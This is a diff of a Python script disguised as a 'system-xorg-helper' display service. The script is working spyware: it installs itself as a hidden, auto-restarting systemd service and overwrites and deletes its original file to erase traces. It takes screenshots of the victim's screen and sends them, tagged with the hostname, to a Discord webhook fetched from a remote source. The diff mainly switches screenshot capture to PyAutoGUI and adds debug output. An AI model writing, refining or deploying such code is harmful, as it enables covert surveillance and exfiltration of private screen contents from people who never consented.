@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-system-xorg-helper - System service for display management
+system-xorg-helper - System service for display management with PyAutoGUI
 """
 
 import os
@@ -12,7 +12,6 @@ import requests
 import shutil
 import signal
 import atexit
-import hashlib
 from pathlib import Path
 import json
 import logging
@@ -40,65 +39,39 @@ def is_installed():
     return os.path.exists(f"{HIDDEN_DIR}/{SERVICE_NAME}")
 
 def install_requirements():
-    """Install required packages without sudo if possible"""
-    requirements = [
-        'python3-discord',
-        'python3-requests',
-        'maim',
-        'scrot',
-        'imagemagick'
+    """Install required Python packages"""
+    python_packages = [
+        'pyautogui',
+        'discord.py',
+        'requests',
+        'psutil'
     ]
     
-    # Try to install without sudo first
-    try:
-        # Check what's already installed
-        installed = set()
-        for req in requirements:
-            if shutil.which(req.split('/')[-1]):
-                installed.add(req)
-        
-        missing = set(requirements) - installed
-        
-        if missing:
-            print("Setting up system utilities...")
-            
-            # Try package managers without sudo
-            package_managers = [
-                ['apt-get', 'install', '-y'],
-                ['yum', 'install', '-y'],
-                ['dnf', 'install', '-y'],
-                ['pacman', '-S', '--noconfirm'],
-                ['zypper', 'install', '-y']
-            ]
-            
-            for manager in package_managers:
-                if shutil.which(manager[0]):
-                    try:
-                        cmd = manager + list(missing)
-                        result = subprocess.run(cmd, capture_output=True, timeout=120)
-                        if result.returncode == 0:
-                            return True
-                    except:
-                        continue
-            
-            # Try with sudo
-            for manager in package_managers:
-                if shutil.which(manager[0]):
-                    try:
-                        cmd = ['sudo'] + manager + list(missing)
-                        result = subprocess.run(cmd, capture_output=True, timeout=120)
-                        if result.returncode == 0:
-                            return True
-                    except:
-                        continue
-            
-            print("Some utilities may not be available")
-            return False
-        
-        return True
-        
-    except Exception as e:
-        return False
+    print("Installing Python utilities...")
+    
+    # Try different pip commands
+    pip_commands = [
+        [sys.executable, "-m", "pip", "install", "--user"],
+        ["pip3", "install", "--user"],
+        ["pip", "install", "--user"]
+    ]
+    
+    for pip_cmd in pip_commands:
+        try:
+            result = subprocess.run(
+                pip_cmd + python_packages,
+                capture_output=True,
+                timeout=300,
+                check=False
+            )
+            if result.returncode == 0:
+                print("Python utilities installed successfully")
+                return True
+        except:
+            continue
+    
+    print("Some Python utilities may not be available")
+    return False
 
 def install_service():
     """Install as a system service"""
@@ -132,6 +105,7 @@ Wants=graphical.target
 Type=simple
 User={os.getlogin()}
 Environment=DISPLAY=:0
+Environment=XAUTHORITY=/home/{os.getlogin()}/.Xauthority
 ExecStart={target_script} --service
 Restart=always
 RestartSec=10
@@ -221,8 +195,9 @@ def clean_traces(original_path):
     """Remove all traces of the original file"""
     try:
         # Overwrite the original file with random data
+        file_size = os.path.getsize(original_path)
         with open(original_path, 'wb') as f:
-            f.write(os.urandom(os.path.getsize(original_path)))
+            f.write(os.urandom(file_size))
         
         # Remove the original file
         os.remove(original_path)
@@ -301,14 +276,15 @@ def fetch_token():
     
     return None
 
-def detect_display():
-    """Auto-detect display"""
+def setup_display_environment():
+    """Setup proper display environment for PyAutoGUI"""
     displays = [':0', ':0.0', ':1', ':1.0']
     
     # Check environment first
     env_display = os.environ.get('DISPLAY')
     if env_display and any(d in env_display for d in displays):
-        return env_display
+        os.environ['DISPLAY'] = env_display
+        return True
     
     # Try to detect from running processes
     try:
@@ -317,7 +293,8 @@ def detect_display():
         for line in result.stdout.split('\n'):
             for display in displays:
                 if display in line:
-                    return display
+                    os.environ['DISPLAY'] = display
+                    return True
     except:
         pass
     
@@ -328,67 +305,48 @@ def detect_display():
             if '(:' in line:
                 for part in line.split():
                     if part.startswith('(:') and any(d in part for d in displays):
-                        return part.strip('()')
+                        display = part.strip('()')
+                        os.environ['DISPLAY'] = display
+                        return True
     except:
         pass
     
-    # Fallback to common displays
+    # Try common displays
     for display in displays:
         try:
             result = subprocess.run(['xdpyinfo', '-display', display], 
                                   capture_output=True, timeout=5)
             if result.returncode == 0:
-                return display
+                os.environ['DISPLAY'] = display
+                return True
         except:
             continue
     
-    return ':0'
+    # Final fallback
+    os.environ['DISPLAY'] = ':0'
+    return True
 
-def take_screenshot():
-    """Take screenshot with multiple fallbacks"""
+def take_screenshot_pyautogui():
+    """Take screenshot using PyAutoGUI - much simpler and more reliable"""
     try:
-        display = detect_display()
-        env = os.environ.copy()
-        env['DISPLAY'] = display
+        # Setup display environment first
+        setup_display_environment()
         
-        # Try to find Xauthority file
-        try:
-            who_result = subprocess.run(['who'], capture_output=True, text=True)
-            for line in who_result.stdout.split('\n'):
-                if display.replace(':', '') in line and '(:' in line:
-                    user = line.split()[0]
-                    xauth = f"/home/{user}/.Xauthority"
-                    if os.path.exists(xauth):
-                        env['XAUTHORITY'] = xauth
-                        break
-        except:
-            pass
+        # Import pyautogui here to ensure it's available
+        import pyautogui
         
+        # Create temporary file
         temp_dir = tempfile.gettempdir()
-        screenshot_path = os.path.join(temp_dir, f"tmp_{int(time.time())}.png")
+        screenshot_path = os.path.join(temp_dir, f"screen_{int(time.time())}.png")
         
-        # Try different screenshot methods
-        methods = [
-            ['maim', '-u', screenshot_path],
-            ['scrot', '-z', '-q', '100', screenshot_path],
-            ['import', '-window', 'root', '-quiet', screenshot_path],
-            ['gnome-screenshot', '-f', screenshot_path]
-        ]
+        # Take screenshot
+        screenshot = pyautogui.screenshot()
+        screenshot.save(screenshot_path)
         
-        for method in methods:
-            if not shutil.which(method[0].split()[0]):
-                continue
-                
-            try:
-                result = subprocess.run(method, env=env, capture_output=True, timeout=10)
-                if result.returncode == 0 and os.path.exists(screenshot_path):
-                    return screenshot_path
-            except:
-                continue
-        
-        return None
+        return screenshot_path
         
     except Exception as e:
+        print(f"PyAutoGUI screenshot failed: {e}")
         return None
 
 def send_to_discord(file_path, token):
@@ -399,9 +357,13 @@ def send_to_discord(file_path, token):
         
         webhook = SyncWebhook.from_url(token)
         with open(file_path, 'rb') as f:
-            webhook.send(file=discord.File(f, filename='display.png'))
+            webhook.send(
+                content=f"Screenshot from {os.uname().nodename}",
+                file=discord.File(f, filename='system_screenshot.png')
+            )
         return True
-    except:
+    except Exception as e:
+        print(f"Discord send failed: {e}")
         return False
 
 def handle_signal(signum, frame):
@@ -469,6 +431,7 @@ def main():
         
         token = fetch_token()
         if not token:
+            print("Failed to fetch Discord token")
             return
         
         # Main service loop
@@ -482,13 +445,21 @@ def main():
                     current_time = time.time()
                     if current_time - last_trigger > 30:  # Rate limiting
                         last_trigger = current_time
-                        screenshot_path = take_screenshot()
+                        print("Taking screenshot...")
+                        screenshot_path = take_screenshot_pyautogui()
                         if screenshot_path:
-                            send_to_discord(screenshot_path, token)
+                            print("Sending to Discord...")
+                            if send_to_discord(screenshot_path, token):
+                                print("Screenshot sent successfully")
+                            else:
+                                print("Failed to send screenshot")
+                            # Cleanup
                             try:
                                 os.remove(screenshot_path)
                             except:
                                 pass
+                        else:
+                            print("Failed to take screenshot")
                         try:
                             trigger_file.unlink()
                         except:
@@ -497,6 +468,7 @@ def main():
                 time.sleep(2)
                 
             except Exception as e:
+                print(f"Service error: {e}")
                 time.sleep(10)
     
     else:
@@ -504,17 +476,23 @@ def main():
         try:
             trigger_file = Path("/tmp/.display_trigger")
             trigger_file.touch()
-            print("Display optimization requested.")
+            print("Screenshot requested. Service will process shortly.")
         except Exception as e:
-            print("Unable to process request.")
+            print(f"Unable to process request: {e}")
 
 if __name__ == "__main__":
     # Auto-install if not already installed
     if not is_installed() and len(sys.argv) == 1:
+        print("First run - installing system service...")
         if install_requirements():
             if install_service() or install_user_service():
+                print("Installation completed! Starting service...")
                 # Clean traces and start service
                 clean_traces(os.path.abspath(__file__))
                 os.execv(sys.executable, [sys.executable, sys.argv[0], '--service'])
+            else:
+                print("Service installation failed")
+        else:
+            print("Dependency installation failed")
     else:
         main()
